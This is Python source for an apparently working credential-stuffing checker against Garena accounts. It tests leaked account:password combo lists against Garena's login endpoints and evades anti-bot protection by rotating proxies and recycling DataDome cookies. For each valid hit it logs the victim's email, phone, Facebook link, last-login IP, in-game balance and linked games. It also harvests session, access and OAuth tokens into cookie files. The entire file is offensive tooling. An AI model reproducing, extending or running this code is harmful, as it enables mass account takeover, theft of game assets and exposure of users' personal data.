        email_verified = details.get('email_verified', False)
        username = details.get('username', 'N/A')
        mobile_n = details['personal'].get('mobile_no', 'N/A')
        country_code = details['personal'].get('country_code', 'N/A')
        shell = details['profile'].get('shell_balance', 0)
        is_clean = details.get('is_clean', False)
        bind_status = 'CLEAN' if is_clean else 'NOT CLEAN'
        formatted_mobile = mask(mobile_n, country_code)

        if email and email != 'N/A' and ('@' in email):
            verification_status = (
                '(Verified)' if email_verified else '(Not Verified)'
            )
            email_display = f'{email} {verification_status}'
        else:
            email_display = 'N/A'

        fb_username = details['facebook'].get('fb_username', 'N/A')
        fb_uid = details['facebook'].get('fb_uid', 'N/A')
        if fb_uid == 'N/A' or not fb_uid:
            fb_info = 'NOT CONNECTED'
        elif not fb_username or fb_username == 'N/A':
            fb_info = 'FB UNBIND or FB DELETED'
        else:
            fb_info = 'CONNECTED'

        login_history = details.get('login_history', [])
        last_login_info = login_history[0] if login_history else {}
        last_login = last_login_info.get('timestamp', 0)
        last_login_date = (
            time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login))
            if last_login else 'N/A'
        )
        last_login_where = (
            f"{last_login_info.get('source', 'Unknown')}"
            if last_login_info else 'Unknown'
        )

        lvl = 'N/A'
        server = 'N/A'
        ign = 'N/A'
        uid = details.get('uid', 'N/A')

        if has_codm and codm_info:
            lvl = codm_info.get('codm_level', 'N/A')
            server = codm_info.get('region', 'N/A')
            ign = codm_info.get('codm_nickname', 'N/A')
            uid = codm_info.get('uid', uid)
        else:
            lvl = 'NO CODM'
            server = 'NO CODM'
            ign = 'NO CODM'

        rprint(f"\n[dim]{'━' * 65}[/dim]")
        rprint(
            f"[bold bright_green]✔ VALID HIT[/bold bright_green]  "
            f"[dim]│[/dim]  [bold white]{account}:{password}[/bold white]"
        )
        rprint(f"[dim]{'─' * 65}[/dim]")
        rprint(f" [dim]•[/dim] [cyan]Username :[/cyan] [white]{username}[/white]")
        rprint(
            f" [dim]•[/dim] [cyan]Shells   :[/cyan] "
            f"[bold bright_yellow]{shell}[/bold bright_yellow]"
        )
        rprint(f" [dim]•[/dim] [cyan]Email    :[/cyan] [white]{email_display}[/white]")
        rprint(f" [dim]•[/dim] [cyan]Mobile   :[/cyan] [white]{formatted_mobile}[/white]")
        rprint(f" [dim]•[/dim] [cyan]Facebook :[/cyan] [white]{fb_info}[/white]")
        rprint(f"[dim]{'─' * 65}[/dim]")
        rprint(f" [bold bright_cyan]◈ CODM DETAILS[/bold bright_cyan]")
        rprint(f" [dim]•[/dim] [cyan]IGN      :[/cyan] [white]{ign}[/white]")
        rprint(f" [dim]•[/dim] [cyan]Level    :[/cyan] [white]{lvl}[/white]")
        rprint(f" [dim]•[/dim] [cyan]Server   :[/cyan] [white]{server}[/white]")
        rprint(f" [dim]•[/dim] [cyan]UID      :[/cyan] [white]{uid}[/white]")
        rprint(f"[dim]{'─' * 65}[/dim]")
        status_color = 'bright_green' if is_clean else 'yellow'
        rprint(
            f" [dim]•[/dim] [cyan]Status   :[/cyan] "
            f"[bold {status_color}]{bind_status}[/bold {status_color}]"
        )
        rprint(
            f" [dim]•[/dim] [cyan]Last Log :[/cyan] [white]{last_login_date}[/white] "
            f"[dim]({last_login_where})[/dim]"
        )

        if game_connections:
            rprint(f"[dim]{'─' * 65}[/dim]")
            rprint(f" [bold bright_magenta]◈ OTHER GAMES[/bold bright_magenta]")
            for gc in game_connections:
                rprint(
                    f" [dim]•[/dim] [magenta]{gc.get('game', 'Game')}:[/magenta] "
                    f"[white]{gc.get('role', 'Unknown')} "
                    f"({gc.get('region', 'N/A')})[/white]"
                )

        rprint(f"[dim]{'━' * 65}[/dim]\n")

        if active:
            sys.stdout.write(active.render() + '\n')
            sys.stdout.flush()

def spectate(
    account, password, details, codm_info, has_codm,
    error_reason=None, game_connections=None
):
    reveal(
        account, password, details, codm_info, has_codm,
        error_reason, game_connections, is_elegant=True
    )

purgequeue = []
purgelock = threading.Lock()
purgebatch = 50

def flush(vault, combo_file_path, force=False):
    with purgelock:
        if not purgequeue:
            return
        if not force and len(purgequeue) < purgebatch:
            return
        batch = list(purgequeue)
        purgequeue.clear()
    if not batch:
        return
    target_set = set(b.strip() for b in batch)
    try:
        fp = Path(combo_file_path)
        with vault.lock:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = fh.readlines()
            with open(fp, 'w', encoding='utf-8') as fh:
                for line in lines:
                    if line.strip() not in target_set:
                        fh.write(line)
    except Exception:
        pass

def enqueue(account, password, vault, combo_file_path):
    with purgelock:
        purgequeue.append(f'{account}:{password}')
    if len(purgequeue) >= purgebatch:
        threading.Thread(
            target=flush,
            args=(vault, combo_file_path),
            daemon=True
        ).start()

def process(
    session, account, password, cookie_manager, datadome_manager,
    stats, scribe, vault, combo_file_path, auto_remove,
    use_elegant_display=False, suppress_print=False,
    proxy_manager=None
):
    ceiling = 15
    attempt = 0

    def _display(acc, pwd, det, codm, has, err=None, gc=None):
        if not suppress_print:
            (spectate if use_elegant_display else reveal)(
                acc, pwd, det, codm, has, err, gc
            )

    while True:
        attempt += 1
        try:
            datadome_manager.tick_request()
            session.cookies.clear()
            seed(session)
            datadome_manager.clear_session_datadome(session)
            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(session, current_datadome)
            else:
                saved_ck = cookie_manager.pick()
                if saved_ck:
                    instill(session, saved_ck)
                    val = pluck(saved_ck)
                    if val:
                        datadome_manager.set_datadome(val)
                        datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = (
                        dict(session.proxies)
                        if hasattr(session, 'proxies') and session.proxies
                        else None
                    )
                    datadome = garner(session, proxies_arg=proxy_dict)
                    if datadome:
                        datadome_manager.set_datadome(datadome)
                        datadome_manager.set_session_datadome(session, datadome)

            v1, v2, new_datadome = probe(
                session, account, datadome_manager, cookie_manager,
                proxy_manager=proxy_manager
            )

            if v1 == 'IP_BLOCKED':
                if proxy_manager and proxy_manager.ready():
                    session.proxies.clear()
                    session.proxies.update(proxy_manager.next())
                    if attempt <= ceiling:
                        continue
                if datadome_manager.wait_for_ip_change(session):
                    session.close()
                    session = forge()
                    session.cookies.clear()
                    seed(session)
                    datadome_manager.clear_session_datadome(session)
                    return 'IP_CHANGED'
                else:
                    stats.accrue(is_error=True)
                    account_data = {
                        'account': account,
                        'password': password,
                        'is_error': True,
                        'error_reason': 'IP Change Timeout'
                    }
                    scribe.add(account_data)
                    if auto_remove:
                        enqueue(account, password, vault, combo_file_path)
                    return 'ERROR'

            if v1 == 'NETWORK_ERROR':
                if attempt < ceiling:
                    backoff = min(2 ** attempt, 30) + random.uniform(0, 2)
                    if proxy_manager and proxy_manager.ready():
                        try:
                            session.proxies.clear()
                            session.proxies.update(proxy_manager.next())
                        except Exception:
                            pass
                    if not suppress_print:
                        print(
                            f'  {yl}⚠  Network error — rotating proxy, '
                            f'backoff {backoff:.1f}s ({attempt}/{ceiling}){rst}'
                        )
                    time.sleep(backoff)
                    continue
                err_data = {
                    'account': account,
                    'password': password,
                    'is_error': True,
                    'error_reason': 'Network Error'
                }
                stats.accrue(is_error=True)
                scribe.add(err_data)
                stats.push(success=False, error_reason='Network Error')
                if auto_remove:
                    enqueue(account, password, vault, combo_file_path)
                return 'ERROR'

            if v1 == 'NO_ACCOUNT':
                stats.accrue(valid=False)
                account_data = {
                    'account': account,
                    'password': password,
                    'is_error': True,
                    'error_reason': 'error_auth'
                }
                scribe.add(account_data)
                stats.push(
                    success=False,
                    error_reason="Account Doesn't Exist"
                )
                _display(
                    account, password, None, None, False,
                    err="Account Doesn't Exist!"
                )
                if auto_remove:
                    enqueue(account, password, vault, combo_file_path)
                return 'ERROR'

            if v1 == 'ERROR_AUTH':
                reason = str(v2) if v2 else 'error_auth'
                stats.accrue(valid=False)
                account_data = {
                    'account': account,
                    'password': password,
                    'is_error': True,
                    'error_reason': reason
                }
                scribe.add(account_data)
                stats.push(success=False, error_reason=reason)
                _display(account, password, None, None, False, err=reason)
                if auto_remove:
                    enqueue(account, password, vault, combo_file_path)
                return 'ERROR'

            if not v1 or not v2:
                if attempt <= ceiling:
                    saved_ck = cookie_manager.pick()
                    if saved_ck:
                        instill(session, saved_ck)
                        val = pluck(saved_ck)
                        if val:
                            datadome_manager.set_datadome(val)
                    if proxy_manager and proxy_manager.ready():
                        session.proxies.clear()
                        session.proxies.update(proxy_manager.next())
                    continue
                stats.accrue(is_error=True)
                account_data = {
                    'account': account,
                    'password': password,
                    'is_error': True,
                    'error_reason': 'Prelogin Failed'
                }
                scribe.add(account_data)
                stats.push(success=False, error_reason='Prelogin Failed')
                if auto_remove:
                    enqueue(account, password, vault, combo_file_path)
                return 'ERROR'

            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                datadome_manager.set_session_datadome(session, new_datadome)

            sso_key = admit(session, account, password, v1, v2)

            if not sso_key:
                err_data = {
                    'account': account,
                    'password': password,
                    'is_error': True,
                    'error_reason': 'Invalid Credentials'
                }
                stats.accrue(valid=False)
                scribe.add(err_data)
                stats.push(success=False, error_reason='Wrong Password')
                _display(
                    account, password, None, None, False,
                    err='Incorrect Password'
                )
                if auto_remove:
                    enqueue(account, password, vault, combo_file_path)
                return 'ERROR'

            if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                reason = sso_key.split(':', 1)[1]
                err_data = {
                    'account': account,
                    'password': password,
                    'is_error': True,
                    'error_reason': reason
                }
                stats.accrue(valid=False)
                scribe.add(err_data)
                _display(account, password, None, None, False, err=reason)
                if auto_remove:
                    vault.excise(combo_file_path, f'{account}:{password}')
                return 'ERROR'

            try:
                _sk_for_ac = session.cookies.get('session_key') or sso_key
                capture(session, _sk_for_ac)
            except Exception:
                pass

            persist(session)
            cookie_parts = []
            for k in [
                'apple_state_key', 'datadome', 'sso_key',
                'ac_session', 'session_key',
                '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'
            ]:
                v = session.cookies.get(k)
                if v:
                    cookie_parts.append(f'{k}={v}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

            headers = {
                'accept': '*/*',
                'referer': 'https://account.garena.com/',
                'user-agent': (
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                    'Chrome/129.0.0.0 Safari/537.36'
                )
            }
            if cookie_header:
                headers['cookie'] = cookie_header

            response = session.get(
                'https://account.garena.com/api/account/init',
                headers=headers,
                timeout=12
            )

            if response.status_code == 403:
                bad_cookie = (
                    session.cookies.get('datadome')
                    or datadome_manager.get_datadome()
                )
                if bad_cookie:
                    cookie_manager.ban(bad_cookie)
                if proxy_manager and proxy_manager.ready():
                    _cur_proxy = (
                        session.proxies.get('http')
                        or session.proxies.get('https')
                    )
                    if _cur_proxy:
                        proxy_manager.fault(_cur_proxy, is_403=True)
                if datadome_manager.handle_403(session):
                    if attempt < ceiling:
                        backoff = min(2 ** attempt, 60) + random.uniform(0, 3)
                        if not suppress_print:
                            print(
                                f'  {yl}⚠  403 — backoff {backoff:.1f}s '
                                f'({attempt}/{ceiling}){rst}'
                            )
                        time.sleep(backoff)
                        continue
                err_data = {
                    'account': account,
                    'password': password,
                    'is_error': True,
                    'error_reason': 'Cookie Banned/IP Blocked'
                }
                stats.accrue(is_error=True)
                scribe.add(err_data)
                if auto_remove:
                    enqueue(account, password, vault, combo_file_path)
                return 'ERROR'

            try:
                account_data_json = response.json()
            except json.JSONDecodeError:
                if attempt < ceiling:
                    if not suppress_print:
                        print(
                            f'  {yl}⚠  Invalid response, retrying '
                            f'({attempt}/{ceiling}){rst}'
                        )
                    time.sleep(2)
                    continue
                err_data = {
                    'account': account,
                    'password': password,
                    'is_error': True,
                    'error_reason': 'Invalid Server Response'
                }
                stats.accrue(is_error=True)
                scribe.add(err_data)
                if auto_remove:
                    enqueue(account, password, vault, combo_file_path)
                return 'ERROR'

            if 'error_auth' in account_data_json:
                err_data = {
                    'account': account,
                    'password': password,
                    'is_error': True,
                    'error_reason': 'Incorrect Password'
                }
                stats.accrue(valid=False)
                scribe.add(err_data)
                _display(
                    account, password, None, None, False,
                    err='Incorrect Password'
                )
                if auto_remove:
                    enqueue(account, password, vault, combo_file_path)
                return 'ERROR'

            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    err_data = {
                        'account': account,
                        'password': password,
                        'is_error': True,
                        'error_reason': "Account Doesn't Exist"
                    }
                    stats.accrue(valid=False)
                    scribe.add(err_data)
                    _display(
                        account, password, None, None, False,
                        err="Account Doesn't Exist!"
                    )
                    if auto_remove:
                        vault.excise(combo_file_path, f'{account}:{password}')
                    return 'ERROR'
                else:
                    err_data = {
                        'account': account,
                        'password': password,
                        'is_error': True,
                        'error_reason': error_msg
                    }
                    stats.accrue(is_error=True)
                    scribe.add(err_data)
                    _display(account, password, None, None, False, err=error_msg)
                    if auto_remove:
                        vault.excise(combo_file_path, f'{account}:{password}')
                    return 'ERROR'

            if 'user_info' in account_data_json:
                details = dissect(account_data_json)
                details['login_history'] = account_data_json.get(
                    'login_history', []
                )
            else:
                details = dissect({'user_info': account_data_json})

            codm_session = requests.Session()
            for cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                if cookie_name in session.cookies:
                    codm_session.cookies.set(
                        cookie_name,
                        session.cookies.get(cookie_name),
                        domain='.garena.com'
                    )

            has_codm, codm_info = inspect(codm_session, account)
            codm_session.close()

            game_connections = []
            if other:
                try:
                    if not suppress_print:
                        console.print(
                            f'  [dim]🔄 Checking game connections '
                            f'for {account}...[/dim]'
                        )
                    game_connections = games(session, account)
                    if game_connections:
                        if not suppress_print:
                            console.print(
                                f'  [dim]✓ Found {len(game_connections)} '
                                f'game connection(s)[/dim]'
                            )
                            for g in game_connections:
                                console.print(
                                    f'  [dim]  • {g.get("game")}: '
                                    f'{g.get("role")} '
                                    f'({g.get("region")})[/dim]'
                                )
                    else:
                        if not suppress_print:
                            console.print(
                                '  [dim]✗ No game connections found[/dim]'
                            )
                except Exception as _ge:
                    if not suppress_print:
                        console.print(
                            f'  [yellow]⚠ Game check error: {_ge}[/yellow]'
                        )
                    logger.warning(f'[GAMES] Failed for {account}: {_ge}')

            fresh_datadome = datadome_manager.extract_datadome_from_session(
                session
            )
            if fresh_datadome:
                cookie_manager.keep(fresh_datadome)

            mobile_n = details['personal'].get('mobile_no', 'N/A')
            country_code = details['personal'].get('country_code', 'N/A')
            formatted_mobile = mask(mobile_n, country_code)

            email = details.get('email', 'N/A')
            email_verified = details.get('email_verified', False)
            if email and email != 'N/A' and ('@' in email):
                email_display = (
                    f'{email} '
                    f'{"(Verified)" if email_verified else "(Not Verified)"}'
                )
            else:
                email_display = 'N/A'

            fb_username = details['facebook'].get('fb_username', 'N/A')
            fb_uid = details['facebook'].get('fb_uid', 'N/A')
            fb_link = (
                f'https://www.facebook.com/profile.php?id={fb_uid}'
                if fb_uid != 'N/A' and fb_uid
                else 'N/A'
            )

            if fb_uid == 'N/A' or not fb_uid:
                fb_info = 'NOT CONNECTED'
            elif not fb_username or fb_username == 'N/A':
                fb_info = 'FB UNBIND or FB DELETED'
            else:
                fb_info = 'CONNECTED'

            login_history = details.get('login_history', [])
            last_login_info = login_history[0] if login_history else {}
            last_login = last_login_info.get('timestamp', 0)
            last_login_date = (
                time.strftime(
                    '%B %d, %Y | %I:%M %p',
                    time.localtime(last_login)
                )
                if last_login else 'N/A'
            )
            last_login_where = (
                f"{last_login_info.get('source', 'Unknown')}"
                if last_login_info else 'Unknown'
            )
            last_login_ip = (
                last_login_info.get('ip', 'N/A')
                if last_login_info else 'N/A'
            )
            last_login_country = (
                last_login_info.get('country', 'N/A')
                if last_login_info else 'N/A'
            )

            shell_balance = details['profile'].get('shell_balance', 0)

            account_data = {
                'account': account,
                'password': password,
                'uid': details.get('uid', 'N/A'),
                'username': details.get('username', 'N/A'),
                'nickname': details.get('nickname', 'N/A'),
                'email': details.get('email', 'N/A'),
                'email_display': email_display,
                'formatted_mobile': formatted_mobile,
                'country': details['personal'].get('country', 'N/A'),
                'shell_balance': shell_balance,
                'account_status': details['status'].get(
                    'account_status', 'N/A'
                ),
                'fb_username': fb_username,
                'fb_uid': fb_uid,
                'fb_link': fb_link,
                'fb_info': fb_info,
                'bind_status': details.get('bind_status', 'N/A'),
                'is_clean': details.get('is_clean', False),
                'has_codm': has_codm,
                'is_error': False,
                'last_login_date': last_login_date,
                'last_login_where': last_login_where,
                'last_login_ip': last_login_ip,
                'last_login_country': last_login_country,
                'game_connections': game_connections
            }

            if has_codm and codm_info:
                account_data.update({
                    'codm_level': int(codm_info.get('codm_level', 0)),
                    'codm_region': codm_info.get('region', 'N/A'),
                    'codm_nickname': codm_info.get('codm_nickname', 'N/A'),
                    'codm_uid': codm_info.get('uid', 'N/A'),
                    'region_code': codm_info.get('region_code', 'N/A')
                })
            else:
                account_data.update({
                    'codm_level': 0,
                    'codm_region': 'N/A',
                    'codm_nickname': 'N/A',
                    'codm_uid': 'N/A',
                    'region_code': 'N/A'
                })

            scribe.add(account_data)
            if proxy_manager and proxy_manager.ready():
                _cur_proxy = (
                    session.proxies.get('http')
                    or session.proxies.get('https')
                )
                if _cur_proxy:
                    proxy_manager.okay(_cur_proxy)

            codm_level = account_data.get('codm_level', 0)
            stats.accrue(
                valid=True,
                clean=details['is_clean'],
                has_codm=has_codm,
                codm_level=codm_level,
                game_connections=game_connections,
                shell=shell_balance
            )
            stats.push(
                success=True,
                is_clean=details['is_clean'],
                has_codm=has_codm,
                codm_level=codm_level,
                shell_balance=shell_balance
            )

            if other and game_connections:
                stash(
                    account, password, account_data,
                    game_connections, scribe.base_dir
                )

            _display(account, password, details, codm_info, has_codm, gc=game_connections)

            if harvest:
                try:
                    wanted_keys = [
                        'datadome',
                        'sso_key',
                        'token_session',
                        'ac_session',
                        'session_key',
                        'apple_state_key',
                        '_ga',
                        '_ga_XB5PSHEQB4',
                        '_ga_1M7M9L6VPX',
                        '_gid',
                        'fb_state',
                        'google_state',
                        'line_state',
                        'twitter_state',
                        'huawei_state',
                        'vk_state',
                        'tiktok_state',
                        'youtube_state',
                        'cf_clearance',
                        '__cf_bm',
                        'garena_id',
                        'garena_region',
                        'access_token',
                        'open_id',
                        't_open_id'
                    ]
                    found_cookies = {}
                    for name in wanted_keys:
                        val = session.cookies.get(name)
                        if val and name not in found_cookies:
                            found_cookies[name] = val
                    for extra in ('access_token', 'open_id', 't_open_id'):
                        if extra in codm_info and codm_info[extra] not in ('N/A', ''):
                            if extra not in found_cookies:
                                found_cookies[extra] = codm_info[extra]
                    if found_cookies:
                        c_str = "; ".join(
                            f"{k}={v}" for k, v in found_cookies.items()
                        )
                        try:
                            with open("fresh_cookie.txt", "a", encoding="utf-8") as scf:
                                scf.write(c_str + "\n")
                        except Exception:
                            pass
                        if harvest_file:
                            try:
                                with open(harvest_file, "a", encoding="utf-8") as hf:
                                    hf.write(c_str + "\n")
                            except Exception:
                                pass
                except Exception:
                    pass

            if auto_remove:
                vault.excise(combo_file_path, f'{account}:{password}')

            return 'DONE'

        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if attempt < ceiling:
                backoff = min(2 ** attempt, 60) + random.uniform(0, 2)
                if not suppress_print:
                    print(
                        f'  {yl}⚠  Connection/Timeout — backoff '
                        f'{backoff:.1f}s ({attempt}/{ceiling}){rst}'
                    )
                time.sleep(backoff)
                continue
            err_data = {
                'account': account,
                'password': password,
                'is_error': True,
                'error_reason': 'Connection/Timeout Error'
            }
            stats.accrue(is_error=True)
            scribe.add(err_data)
            if auto_remove:
                enqueue(account, password, vault, combo_file_path)
            return 'ERROR'

        except Exception as e:
            if attempt < ceiling:
                time.sleep(2)
                continue
            logger.error(f'[ERROR] Unexpected error processing {account}')
            err_data = {
                'account': account,
                'password': password,
                'is_error': True,
                'error_reason': f'Unexpected Error: {str(e)}'
            }
            stats.accrue(is_error=True)
            scribe.add(err_data)
            if auto_remove:
                enqueue(account, password, vault, combo_file_path)
            return 'ERROR'

def preprobe(session, account, datadome_manager, ceiling=6):
    url = 'https://sso.garena.com/api/prelogin'
    for attempt in range(ceiling):
        try:
            params = {
                'app_id': '10100',
                'account': account,
                'format': 'json',
                'id': str(int(time.time() * 1000))
            }
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for n in ('apple_state_key', 'datadome', 'sso_key'):
                if n in current_cookies:
                    cookie_parts.append(f'{n}={current_cookies[n]}')
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': (
                    f'https://sso.garena.com/universal/login?app_id=10100'
                    f'&redirect_uri=https%3A%2F%2Faccount.garena.com%2F'
                    f'&locale=en-SG&account={account}'
                ),
                'sec-ch-ua': (
                    '"Google Chrome";v="133", "Chromium";v="133", '
                    '"Not=A?Brand";v="99"'
                ),
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': (
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                    'AppleWebKit/537.36 (KHTML, like Gecko) '
                    'Chrome/133.0.0.0 Safari/537.36'
                )
            }
            if cookie_parts:
                headers['cookie'] = '; '.join(cookie_parts)
            resp = session.get(url, headers=headers, params=params, timeout=8)
            new_dd = resp.cookies.get('datadome')
            if new_dd:
                session.cookies.set('datadome', new_dd, domain='.garena.com')
                datadome_manager.set_datadome(new_dd)
            if resp.status_code == 403:
                fresh = garner(session)
                if fresh:
                    datadome_manager.set_datadome(fresh)
                    datadome_manager.set_session_datadome(session, fresh)
                    continue
                return (None, None, None)
            if resp.status_code == 429:
                continue
            resp.raise_for_status()
            if sniff(resp):
                fresh = garner(session)
                if fresh:
                    datadome_manager.set_datadome(fresh)
                    datadome_manager.set_session_datadome(session, fresh)
                continue
            try:
                data = resp.json()
            except Exception:
                continue
            if 'error' in data:
                err = data['error']
                if err == 'error_no_account':
                    return ('NO_ACCOUNT', None, new_dd)
                elif err in ('error_auth', 'error_user_ban', 'error_security_ban'):
                    return ('ERROR_AUTH', err, new_dd)
                continue
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                continue
            return (v1, v2, new_dd)
        except Exception:
            continue
    return (None, None, None)

def games(session, account):
    found = []
    try:
        url = 'https://account.garena.com/api/account/bind'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'referer': 'https://account.garena.com/',
            'user-agent': (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/129.0.0.0 Safari/537.36'
            )
        }
        resp = session.get(url, headers=headers, timeout=12)
        if resp.status_code != 200:
            return found
        data = resp.json()
        binds = data.get('binds') or data.get('game_info') or []
        for entry in binds:
            gname = str(entry.get('game', '')).upper().strip()
            if not gname:
                continue
            found.append({
                'game': gname,
                'role': entry.get('role') or entry.get('nickname') or 'N/A',
                'region': entry.get('region') or entry.get('server') or 'N/A',
                'uid': entry.get('uid', 'N/A')
            })
    except Exception:
        pass
    return found

def stash(account, password, account_data, game_connections, base_dir):
    try:
        gdir = Path(base_dir) / 'Games'
        gdir.mkdir(parents=True, exist_ok=True)
        for gc in game_connections:
            gname = str(gc.get('game', 'Unknown')).strip() or 'Unknown'
            safe = re.sub(r'[^A-Za-z0-9_-]+', '_', gname)
            gpath = gdir / f'{safe}.txt'
            line = (
                f'{account}:{password} | '
                f'role={gc.get("role", "N/A")} | '
                f'region={gc.get("region", "N/A")} | '
                f'uid={gc.get("uid", "N/A")}'
            )
            with open(gpath, 'a', encoding='utf-8') as f:
                f.write(line + '\n')
    except Exception:
        pass

localp = threading.local()
relay = None

def interpret(raw: str):
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if re.match(r"^(https?|socks[45])://", raw, re.IGNORECASE):
        parsed = urllib.parse.urlparse(raw)
        if parsed.hostname and parsed.port:
            return raw
        return None
    if "@" in raw:
        return "http://" + raw
    parts = raw.split(":")
    if len(parts) == 2 and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit():
            host, port, user, pw = a, b, c, d
        elif d.isdigit():
            user, pw, host, port = a, b, c, d
        else:
            return None
        return (
            f"http://{urllib.parse.quote(user, safe='-._~')}:"
            f"{urllib.parse.quote(pw, safe='-._~')}@{host}:{port}"
        )
    return None

def grade(url: str, edge: float = 5.0):
    try:
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or 8080
        if not host:
            return False, "no_host", -1.0
        user = urllib.parse.unquote(parsed.username or "")
        pw = urllib.parse.unquote(parsed.password or "")
    except Exception:
        return False, "parse_err", -1.0

    auth = None
    if user:
        creds = f"{user}:{pw}".encode()
        auth = f"Basic {base64.b64encode(creds).decode()}"

    last_err = "dead"
    sock = None

    for host_t, port_t, path_t in [
        ("ip-api.com", 80, "/json/?fields=query,status"),
        ("api.ipify.org", 80, "/?format=json")
    ]:
        sock = None
        try:
            t0 = time.monotonic()
            sock = socket.create_connection((host, port), timeout=edge)
            sock.settimeout(edge)

            lines = [
                f"GET http://{host_t}{path_t} HTTP/1.1",
                f"Host: {host_t}",
                "Accept: application/json",
                "Connection: close"
            ]
            if auth:
                lines.append(f"Proxy-Authorization: {auth}")

            sock.sendall("\r\n".join(lines + ["", ""]).encode())

            data = b""
            while len(data) < 4096:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data and len(data) > 200:
                    break

            latency_ms = (time.monotonic() - t0) * 1000
            status_line = (
                data.decode(errors="replace").split("\r\n", 1)[0]
                if data else ""
            )
            parts = status_line.split(" ", 2)
            code = (
                int(parts[1])
                if len(parts) >= 2 and parts[1].isdigit()
                else 0
            )

            if code == 200:
                body = (
                    data.decode(errors="replace")
                    .split("\r\n\r\n", 1)[-1]
                    .strip()
                )
                if body and body[0] in "0123456789abcdefABCDEF":
                    body = body.split("\r\n", 1)[-1].split("\r\n")[0].strip()
                try:
                    jdata = json.loads(body)
                    ip = str(
                        jdata.get("query") or jdata.get("ip") or "?"
                    ).split(",")[0].strip()
                    return True, ip, latency_ms
                except Exception:
                    return True, "alive(no-ip)", latency_ms

            if code == 407:
                last_err = "auth_failed(407)"
            elif code in (401, 403):
                last_err = f"auth_denied({code})"
            elif code:
                last_err = f"http_{code}"

        except socket.timeout:
            last_err = "connect_timeout"
        except ConnectionRefusedError:
            last_err = "connection_refused"
            break
        except socket.gaierror:
            last_err = "dns_fail"
            break
        except Exception as e:
            last_err = type(e).__name__
        finally:
            if sock is not None:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    sock.close()
                except Exception:
                    pass
                sock = None

    if last_err not in (
        "auth_failed(407)",
        "auth_denied(403)",
        "auth_denied(401)",
        "dns_fail",
        "connection_refused"
    ):
        sock = None
        try:
            t0 = time.monotonic()
            sock = socket.create_connection((host, port), timeout=edge)
            latency_ms = (time.monotonic() - t0) * 1000
            return True, f"alive(no-ip,{last_err})", latency_ms
        except Exception:
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
                sock = None

    return False, last_err, -1.0

def reach(url, edge=15.0):
    import ssl as sslmod
    try:
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or 8080
        if not host:
            return (False, "no_host", -1.0)
        user = urllib.parse.unquote(parsed.username or "")
        pw = urllib.parse.unquote(parsed.password or "")
    except Exception:
        return (False, "parse_err", -1.0)

    auth = None
    if user:
        creds = f"{user}:{pw}".encode()
        auth = "Basic " + base64.b64encode(creds).decode()

    try:
        t0 = time.monotonic()
        sock = socket.create_connection((host, port), timeout=edge)
        sock.settimeout(edge)

        req = [
            "CONNECT sso.garena.com:443 HTTP/1.1",
            "Host: sso.garena.com:443",
            "Proxy-Connection: keep-alive",
        ]
        if auth:
            req.append(f"Proxy-Authorization: {auth}")
        sock.sendall(("\r\n".join(req) + "\r\n\r\n").encode())

        data = b""
        while b"\r\n\r\n" not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk

        status_line = data.decode(errors="replace").split("\r\n", 1)[0]
        parts = status_line.split(" ", 2)
        code = (
            int(parts[1])
            if len(parts) >= 2 and parts[1].isdigit()
            else 0
        )

        if code != 200:
            try:
                sock.close()
            except Exception:
                pass
            if code == 407:
                return (False, "auth_failed(407)", -1.0)
            if code in (401, 403):
                return (False, f"auth_denied({code})", -1.0)
            return (False, f"connect_{code}", -1.0)

        layer = sslmod.create_default_context()
        tls = layer.wrap_socket(sock, server_hostname="sso.garena.com")
        tls.settimeout(edge)

        tls.sendall(
            b"GET / HTTP/1.1\r\nHost: sso.garena.com\r\n"
            b"Connection: close\r\nUser-Agent: probe\r\n\r\n"
        )
        resp = b""
        try:
            while True:
                chunk = tls.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 512:
                    break
        except Exception:
            pass

        latency_ms = (time.monotonic() - t0) * 1000
        try:
            tls.close()
        except Exception:
            pass

        return (True, "reachable", latency_ms)

    except socket.timeout:
        return (False, "connect_timeout", -1.0)
    except ConnectionRefusedError:
        return (False, "connection_refused", -1.0)
    except socket.gaierror:
        return (False, "dns_fail", -1.0)
    except Exception as e:
        return (False, type(e).__name__, -1.0)

def vessel():
    if not hasattr(localp, "sock"):
        s = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=1,
            pool_maxsize=1,
            max_retries=0,
            pool_block=False
        )
        s.mount("http://", adapter)
